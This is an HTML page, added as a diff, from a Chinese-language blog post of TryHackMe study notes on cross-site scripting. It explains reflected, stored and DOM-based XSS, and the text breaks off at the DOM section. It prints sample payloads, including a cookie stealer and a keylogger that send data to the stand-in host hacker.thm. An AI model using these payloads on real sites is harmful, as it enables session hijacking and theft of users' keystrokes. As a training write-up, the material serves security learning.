@@ -1,0 +1,1508 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Hekeatsll">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2024/01/27/thm-cross-site scripting(xss跨站脚本漏洞)-学习/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="了解如何检测和利用 XSS 漏洞，这能让你控制其他访问者的浏览器。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="THM-Cross-site Scripting(XSS跨站脚本漏洞)-学习">
+<meta property="og:url" content="http://example.com/2024/01/27/THM-Cross-site%20Scripting(XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%BC%8F%E6%B4%9E)-%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="了解如何检测和利用 XSS 漏洞，这能让你控制其他访问者的浏览器。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/articleimg/image-20221123182521764.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221123201325458.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221123223403997.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221123223607622.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221123223707848.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221123230940702.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221124193527880.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221124215549328.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221124220954543.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221125184753876.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221125191134331.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221125195947941.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221125200137180.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221125200535122.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221125200920338.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221125201040848.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221125201914663.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221125202407190.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221125211621901.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221125212321185.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221125214406567.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221125215309944.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221125215813629.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221125220456444.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221125221135597.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221125213124007.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221126143216275.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221126143244474.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221126143417254.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221126143322719.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221126143520471.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221126143450961.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221126143627043.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221126143549627.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221126143736538.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221126143650789.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221126143814413.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221126143931572.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221126143856864.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221126144012752.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221126082612108.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221126083341742.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221126091444778.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221126144914883.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221126144951632.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221126145053502.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221126145128837.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221126145148959.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221126145330849.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221126145440317.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221126145533330.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221126152432254.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221126152730915.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221126152850608.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221126152939584.png">
+<meta property="article:published_time" content="2024-01-27T04:14:55.000Z">
+<meta property="article:modified_time" content="2024-01-27T04:16:00.659Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="TryHackMe">
+<meta property="article:tag" content="Web安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/articleimg/image-20221123182521764.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/20240103084029.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/20240103084029.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/20240103084029.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            THM-Cross-site Scripting(XSS跨站脚本漏洞)-学习 -
+        
+        Hekeats-Limited Lyric
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    
+        <style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    
+<script src="/js/libs/anime.min.js"></script>
+
+    <h1 class="ml13">
+        Hekeats-Limited Lyric
+    </h1>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+
+        anime.timeline({loop: true})
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [100,0],
+                translateZ: 0,
+                opacity: [0,1],
+                easing: "easeOutExpo",
+                duration: 1400,
+                delay: (el, i) => 300 + 30 * i
+            }).add({
+            targets: '.ml13 .letter',
+            translateY: [0,-100],
+            opacity: [1,0],
+            easing: "easeInExpo",
+            duration: 1200,
+            delay: (el, i) => 100 + 30 * i
+        });
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            hidePreloaderAfterTimeout(1000); // Hide after 1000 milliseconds once the window has loaded
+        });
+
+        // Backup failsafe: Hide preloader after a maximum of 5000 milliseconds, regardless of the window load event
+        hidePreloaderAfterTimeout(5000);
+
+        function hidePreloaderAfterTimeout(delay) {
+            setTimeout(function () {
+                var preloader = document.querySelector('.preloader');
+                preloader.style.opacity = '0';
+                setTimeout(function () {
+                    preloader.style.display = 'none';
+                }, 200);
+            }, delay);
+        }
+    </script>
+</div>
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    <!--- Font Part-->
+    
+    
+    
+        <link href="" rel="stylesheet">
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":5,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":true,"family":"Noto Sans SC","url":null},"english":{"enable":false,"family":null,"url":"https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700&display=swap"}},"content_max_width":"1000px","sidebar_width":"350px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-o57z3m.jpg","dark":"/images/wallhaven-28m68g.jpg"},"title":"Hekeats-Limited Lyric","subtitle":{"text":["死亡无时无刻不围绕在我们身边，然而我们依旧挥霍着时间，以为生命 享之不尽⌛️"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/Hekeatsll/","instagram":null,"zhihu":null,"twitter":"https://twitter.com/Hekeatsll","email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.6.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":5},"tags":{"enable":true,"limit":5}},"footerStart":"2024/1/16 0:30:30"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Hekeats-Limited Lyric
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">8</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">1</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">45</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                
+                
+                <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/03376575e888fd097280c51469c29fbc.png" alt="THM-Cross-site Scripting(XSS跨站脚本漏洞)-学习" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75"/>
+                
+                <div class="w-full flex items-center absolute bottom-0 justify-start">
+                    <h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-bold backdrop-blur-lg rounded-xl border border-border-color ">THM-Cross-site Scripting(XSS跨站脚本漏洞)-学习</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/20240103084029.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Hekeatsll</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-01-27 12:14:55</span>
+        <span class="mobile">2024-01-27 12:14:55</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-01-27 12:16</span>
+            <span class="mobile">2024-01-27 12:16</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/TryHackMe%E7%AC%94%E8%AE%B0/">TryHackMe笔记</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/TryHackMe/">TryHackMe</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Web%E5%AE%89%E5%85%A8/">Web安全</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>6.7k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>24 Mins</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <p>本文相关的TryHackMe实验房间链接：<a class="link"   target="_blank" rel="noopener" href="https://tryhackme.com/room/xss" >https://tryhackme.com/room/xss <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>通过学习相关知识点：了解如何检测和利用 XSS 漏洞，这能让你控制其他访问者的浏览器。</p>
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>先决条件：由于 XSS 是基于 JavaScript 的，因此对js语言有基本的了解对学习XSS漏洞会很有帮助；本文相关的XSS示例并不复杂，对客户端-服务器请求和响应有基本的了解即可。</p>
+<p>跨站脚本，在网络安全社区中更广为人知的名称是 XSS (Cross-site Scripting)，该漏洞被归类为注入攻击，在XSS攻击中：恶意的 JavaScript代码 将被注入到 Web 应用程序中，并且该js代码意图被其他用户无意间执行。 在本文中，你将了解不同的 XSS 类型、如何创建 XSS 有效载荷、如何修改你的 XSS 有效载荷以绕过XSS过滤器等。</p>
+<p>跨站脚本漏洞非常普遍，下面是一些在海量应用中发现的 XSS 漏洞报告；你可以因发现和报告XSS漏洞而获得报酬。</p>
+<ul>
+<li><a class="link"   target="_blank" rel="noopener" href="https://hackerone.com/reports/415484" >XSS found in Shopify <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://hackerone.com/reports/409850" >$7,500 for XSS found in Steam chat <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://hackerone.com/reports/449351" >$2,500 for XSS in HackerOne <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://hackerone.com/reports/283825" >XSS found in Infogram <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+</ul>
+<p><strong>答题</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221123182521764.png"
+                      alt="image-20221123182521764"
+                ></p>
+<h2 id="XSS-Payloads"><a href="#XSS-Payloads" class="headerlink" title="XSS Payloads"></a>XSS Payloads</h2><p><strong>什么是 payload(有效载荷) ?</strong></p>
+<p>在 XSS 中，payload是我们希望在目标计算机上能够被执行的 JavaScript 代码。 payload有两部分，用于 实现意图的部分 和 需要自行修改的部分 。</p>
+<p>payload的“意图”部分是你希望 JavaScript代码 实际执行的操作（我们将在下面的一些示例中进行介绍），而payload的“修改”部分是指我们需要对代码进行更改以使其能够成功执行，因为具体的payload在不同的执行场景下可能存在不同之处（在本文的倒数第二小节中会进行介绍）。</p>
+<p>下面是关于 XSS payload的“意图”的一些示例：</p>
+<p><strong>Proof Of Concept（POC-概念验证）：</strong></p>
+<p>这是最简单的XSS payload，你要做的是证明你可以在网站上实现 XSS。 这通常是通过在页面上弹出一个带有文本字符串的警告框来完成的，例如：</p>
+<p><code>&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;</code></p>
+<p><strong>Session Stealing（会话窃取）：</strong></p>
+<p>用户会话的详细信息（例如登录令牌-login token）通常保存在目标计算机上的 cookie 中。</p>
+<p>下面的 JavaScript 能获取目标的 cookie，先通过 base64 编码 cookie 以确保其能成功传输，然后将其发布到黑客所控制的网站以进行记录。 一旦黑客拥有了这些 cookie值，他们就可以接管目标的会话并能以该用户的身份进行登录。</p>
+<p><code>&lt;script&gt;fetch(&#39;https://hacker.thm/steal?cookie=&#39; + btoa(document.cookie));&lt;/script&gt;</code></p>
+<p><strong>Key Logger（键盘记录器）：</strong></p>
+<p>下面的js代码能充当键盘记录器。 这意味着你在网页上键入的任何内容都将被转发到黑客所控制的网站。 如果将该类型的XSS payload放置在目标网站上用于接收用户登录名或信用卡详细信息的代码处，这可能会非常有害。</p>
+<p><code>&lt;script&gt;document.onkeypress = function(e) &#123; fetch(&#39;https://hacker.thm/log?key=&#39; + btoa(e.key) );&#125;&lt;/script&gt;</code></p>
+<p><strong>Business Logic（业务逻辑）：</strong></p>
+<p>这个XSS payload比上面的例子要具体得多，此处会调用特定的网络资源或 JavaScript 函数。 例如，假设存在一个名为 <code>user.changeEmail()</code> 的用于更改用户电子邮件地址的 JavaScript 函数，对应的XSS payload可能如下所示：</p>
+<p><code>&lt;script&gt;user.changeEmail(&#39;attacker@hacker.thm&#39;);&lt;/script&gt;</code></p>
+<p>如果帐户所对应的电子邮件地址已成功更改，那么攻击者就可以接着尝试执行针对目标用户的重置密码攻击。</p>
+<p>接下来的四个小节将涵盖不同类型的 XSS 漏洞，这些 XSS 漏洞的实现都需要我们编写略有不同的XSS payload（经过精心构造的js代码）并且都需要让payload和用户发生交互。</p>
+<p><strong>答题</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221123201325458.png"
+                      alt="image-20221123201325458"
+                ></p>
+<h2 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h2><p>当用户在 HTTP 请求中提供的数据未经任何验证就能被包含在网页源代码中时，就会发生反射型 XSS。</p>
+<p><strong>示例场景：</strong></p>
+<p>假设现在有一个示例网站，如果你在URL中输入的内容不够准确，则会显示一条错误消息。 错误消息的内容将取自查询字符串中的错误（error）参数，并会直接构建到该页面的源代码中。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221123223403997.png"
+                      alt="image-20221123223403997"
+                ></p>
+<p>如果该web应用程序不检查错误（error）参数的内容，这将允许攻击者在URL中插入一些恶意代码，从而使攻击者能够构建一个恶意的XSS链接：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221123223607622.png"
+                      alt="image-20221123223607622"
+                ></p>
+<p>该漏洞可以按照下图中的场景进行复现：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221123223707848.png"
+                      alt="image-20221123223707848"
+                ></p>
+<p><strong>潜在影响：</strong></p>
+<p>攻击者可以向潜在受害者发送XSS链接，然后让受害者在浏览器上执行相关的XSS payload代码，从而获取到用户会话信息或用户的其他信息（作为测试使用时，XSS payload在执行后 往往产生弹窗、页面重定向、页面嵌套等效果）。</p>
+<p><strong>如何测试反射型 XSS：</strong></p>
+<p>你需要测试每个可能的XSS漏洞入口点，包括：</p>
+<ul>
+<li>URL 查询字符串中的参数（Parameters ）</li>
+<li>URL 文件路径</li>
+<li>HTTP 标头（尽管在实践中不太可能存在XSS漏洞利用）</li>
+</ul>
+<p>一旦你发现了能够反映在 Web 应用程序中的一些数据，你就需要确认你可以成功运行你的 JavaScript Payload；你所构造的Payload将取决于你的代码在web应用程序中的位置。</p>
+<p><strong>答题</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221123230940702.png"
+                      alt="image-20221123230940702"
+                ></p>
+<h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p>顾名思义，存储型XSS的payload能够存储在 Web 应用程序中（例如，将XSS payload存储在数据库中），然后在其他用户访问站点或网页时就能自动运行相关的XSS payload。</p>
+<p><strong>示例场景：</strong></p>
+<p>假设存在一个允许用户发表评论的博客网站，而且评论在发表时不会被检查是否包含 JavaScript代码 或者被过滤掉恶意代码；如果我们在此博客网站上发布包含 JavaScript代码 的评论，那么这些代码将会被存储到 该博客网站所对应的web服务器的后端数据库中。当其他用户访问 包含恶意代码的评论 所对应的博客文章时，用户所使用的浏览器就会自动运行我们之前所嵌入的JavaScript代码。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221124193527880.png"
+                      alt="image-20221124193527880"
+                ></p>
+<p><strong>潜在影响：</strong></p>
+<p>存储型 XSS 中的恶意 JavaScript 代码可以将用户重定向到另一个站点、窃取用户的会话 cookie，或者在充当访问用户的同时在目标网站上执行一些其他操作。</p>
+<p><strong>如何测试存储型 XSS：</strong></p>
+<p>你需要测试 在某个网站上能够存储数据的每个可能的入口点，并且这些被存储的数据能够显示在其他用户可以访问的区域，比如：</p>
+<ul>
+<li>用户发出的对博客文章的评论</li>
+<li>用户的资料信息</li>
+<li>网站的列表信息</li>
+</ul>
+<p>有时候开发人员会认为在客户端限制用户输入值已经是足够好的保护措施，因此尝试将用户输入值更改为 Web 应用程序所不期望的内容是发现存储型 XSS 漏洞的一个很好的方法，例如，一个表单中的年龄（age ）字段通常会期望你提供下拉菜单中的一个整数值，但是，你可以尝试手动发送请求（而不是使用表单来发送请求），这可能将允许你嵌入一些恶意的XSS payload。</p>
+<p>当你找到存储在 Web 应用程序中的一些数据后，你需要再次确认你是否可以成功运行 JavaScript payload，你使用的XSS payload的内容将取决于你的代码在web应用程序中的具体位置。</p>
+<p><strong>答题</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221124215549328.png"
+                      alt="image-20221124215549328"
+                ></p>
+<h2 id="基于DOM的-XSS"><a href="#基于DOM的-XSS" class="headerlink" title="基于DOM的 XSS"></a>基于DOM的 XSS</h2><p><strong>什么是 DOM?</strong></p>
+<p>DOM 代表文档对象模型(Document Object Model)，是 HTML 和 XML 文档的应用程序编程接口(API-application programming interface)，它代表的是一个页面，以便程序可以更改文档结构、样式和内容。 </p>
+<p>所以网页就是一个文档，这个文档可以显示在浏览器窗口中，也可以作为 HTML 源。下面是一个关于 HTML DOM 的图表：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221124220954543.png"
+                      alt="image-20221124220954543"
+                ></p>
+<p>如果你想了解有关 DOM 的更多信息，可以访问 <a class="link"   target="_blank" rel="noopener" href="https://www.w3.org/TR/REC-DOM-Level-1/introduction.html" >w3.org相关页面 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。</p>
+<p><strong>对DOM的利用</strong></p>
